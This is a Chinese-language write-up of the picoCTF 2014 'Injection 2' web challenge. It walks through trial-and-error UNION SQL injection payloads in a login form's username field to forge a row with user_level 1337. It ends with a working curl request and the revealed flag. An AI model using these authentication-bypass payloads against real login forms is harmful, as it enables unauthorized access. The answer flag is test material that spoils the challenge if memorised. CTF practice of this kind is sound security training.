# Injection 2
[網站](http://web2014.picoctf.com/injection2/)，hint：創造一個假的query結果
 * 可以使用UNION！
 * 看到[php code](http://web2014.picoctf.com/injection2/login.phps)，要拿到flag的條件：
  1. SELECT返回結果只能有1個才能進入給flag的程式碼
  2. 表格user的attribute: `user_level >= 1337`

## Solve
 * 使用：
  * username = `hehe' UNION SELECT 'hehe' as username, '123' as password, 1337 as user_level#`
  * password = `123`，登入
 * 但登入失敗，原因是UNION後面加的SELECT和前面的SELECT的column沒對到
  * => 可能是數目不對或是順序不對，試試加一個column：
  * `username = hehe' UNION SELECT null, 'hehe' as username, '123' as password, 1337 as user_level#`
  * `username = hehe' UNION SELECT 'hehe' as username, null, '123' as password, 1337 as user_level#`
  * `username = hehe' UNION SELECT 'hehe' as username, '123' as password, null, 1337 as user_level#`
  * `username = hehe' UNION SELECT 'hehe' as username, '123' as password, 1337 as user_level, null#`
 * 全失敗，加兩個column：
  * `username = hehe' UNION SELECT　null, null, 'hehe' as username, '123' as password, 1337 as user_level#`
  * `username = hehe' UNION SELECT null, 'hehe' as username, null, '123' as password, 1337 as user_level#`
  * `username = hehe' UNION SELECT null, 'hehe' as username, '123' as password, null, 1337 as user_level#`
  * `username = hehe' UNION SELECT null, 'hehe' as username, '123' as password, 1337 as user_level, null#`
  * `username = hehe' UNION SELECT 'hehe' as username, null, null, '123' as password, 1337 as user_level#`
  * `username = hehe' UNION SELECT 'hehe' as username, null, '123' as password, null, 1337 as user_level#`

```
$ curl --request POST 'http://web2014.picoctf.com/injection2/login.php' --data "username=username+%3D+hehe%27+UNION+SELECT+%27hehe%27+as+username%2C+null%2C+%27123%27+as+password%2C+null%2C+1337+as+user_level%23&password=123&debug=0"
<h1>Logged in!</h1><pre>User level: 1337</pre><p>Your flag is: flag_nJZAKGWYt7YfzmTsCV</p>
```
